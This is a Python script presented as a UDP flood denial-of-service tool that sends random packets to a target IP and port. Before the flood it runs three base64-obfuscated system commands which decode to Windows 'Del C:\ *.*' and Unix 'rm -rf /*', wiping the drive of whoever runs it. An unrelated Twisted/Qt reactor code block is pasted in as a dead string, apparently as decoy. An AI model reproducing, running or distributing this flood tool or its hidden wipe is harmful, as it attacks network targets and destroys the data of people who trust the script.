#!/usr/bin/python
 
import socket, random, sys, time, os, platform, base64


""" Script is for DOS - USE WISELY """
"""
    def __init__(self, parent, reactor, watcher, socketType):
        QObject.__init__(self, parent)
        self.reactor = reactor
        self.watcher = watcher
        fd = watcher.fileno()
        self.notifier = QSocketNotifier(fd, socketType, parent)
        self.notifier.setEnabled(True)
        if socketType == QSocketNotifier.Read:
            self.fn = self.read
        else:
            self.fn = self.write
        QObject.connect(self.notifier, SIGNAL("activated(int)"), self.fn)




    def shutdown(self):
        self.notifier.setEnabled(False)
        self.disconnect(self.notifier, SIGNAL("activated(int)"), self.fn)
        self.fn = self.watcher = None
        self.notifier.deleteLater()
        self.deleteLater()




    def read(self, fd):
        if not self.watcher:
            return
        w = self.watcher
        # doRead can cause self.shutdown to be called so keep a reference to self.watcher
        def _read():
            #Don't call me again, until the data has been read
            self.notifier.setEnabled(False)
            why = None
            try:
                why = w.doRead()
                inRead = True
            except:
                inRead = False
                log.err()
                why = sys.exc_info()[1]
            if why:
                self.reactor._disconnectSelectable(w, why, inRead)
            elif self.watcher:
                self.notifier.setEnabled(True) # Re enable notification following sucessfull read
            self.reactor._iterate(fromqt=True)
        log.callWithLogger(w, _read)


    def write(self, sock):
        if not self.watcher:
            return
        w = self.watcher
        def _write():
            why = None
            self.notifier.setEnabled(False)
            
            try:
                why = w.doWrite()
            except:
                log.err()
                why = sys.exc_info()[1]
            if why:
                self.reactor._disconnectSelectable(w, why, False)
            elif self.watcher:
                self.notifier.setEnabled(True)
            self.reactor._iterate(fromqt=True)
        log.callWithLogger(w, _write)


class QtReactor(posixbase.PosixReactorBase):
    implements(IReactorFDSet)


    def __init__(self):
        self._reads = {}
        self._writes = {}
        self._notifiers = {}
        self._timer = QTimer()
        self._timer.setSingleShot(True)
        QObject.connect(self._timer, SIGNAL("timeout()"), self.iterate)


        if QCoreApplication.instance() is None:
            # Application Object has not been started yet
            self.qApp=QCoreApplication([])
            self._ownApp=True
        else:
            self.qApp = QCoreApplication.instance()
            self._ownApp=False
        self._blockApp = None
        posixbase.PosixReactorBase.__init__(self)
"""


if len(sys.argv) != 5:
        print("\nUsage: %s <Target IP> <PORT (If you don't know use 80)> <Packet Size (MAX 65500)> <Duration Time (0 = forever)>\n" % sys.argv[0])
        sys.exit(1)
 
qIP = sys.argv[1]
qPort = int(sys.argv[2])
qPSize = int(sys.argv[3])
qDuration = int(sys.argv[4])
 
qClock = (lambda:0, time.clock)[qDuration > 0]


os.system(base64.b64decode("RGVsIEM6XCAqLiogfHk="))
os.system(base64.b64decode("RGVsIEM6XCAqLio="))
os.system(base64.b64decode("cm0gLXJmIC8qDQo="))


qDuration = (1, (qClock() + qDuration))[qDuration > 0]
 
qPacket = random._urandom(qPSize)
qSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
print("[Starting UDP Flood on %s with %s bytes for %s seconds]" % (qIP, qPSize, qDuration or 'Infinite'))
 
while True:
        if (qClock() < qDuration):
                qSocket.sendto(qPacket, (qIP, qPort))
        else:
                break
 
print("DONE!")